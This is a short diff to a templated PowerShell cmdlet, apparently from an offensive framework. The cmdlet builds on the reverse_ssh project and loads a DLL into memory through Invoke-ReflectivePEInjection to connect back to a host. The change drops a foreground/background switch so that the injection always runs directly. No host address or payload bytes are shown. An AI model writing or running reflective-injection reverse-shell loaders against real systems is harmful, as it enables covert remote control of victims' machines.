@@ -938,9 +938,6 @@ This Cmdlet leverages the reverse_ssh project written in golang
 The host must be reachable directly without any proxy.
 
 #>
-    param (
-        [parameter(Mandatory=$false)] [Switch] $Foreground
-    )
 
     if (-not (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue)) {
         Get-BuiltinModule "Invoke-ReflectivePEInjection"
@@ -950,11 +947,7 @@ The host must be reachable directly without any proxy.
 
     {{'Write-Debug "Connecting back..."'|debug}}
 
-    if ($Foreground) {
-        Invoke-ReflectivePEInjection -PEBytes $DLLBytes
-    } else {
-        Start-Job -ScriptBlock { Invoke-ReflectivePEInjection -PEBytes $DLLBytes }
-    }
+    Invoke-ReflectivePEInjection -PEBytes $DLLBytes
 }
 {% endif %}
 
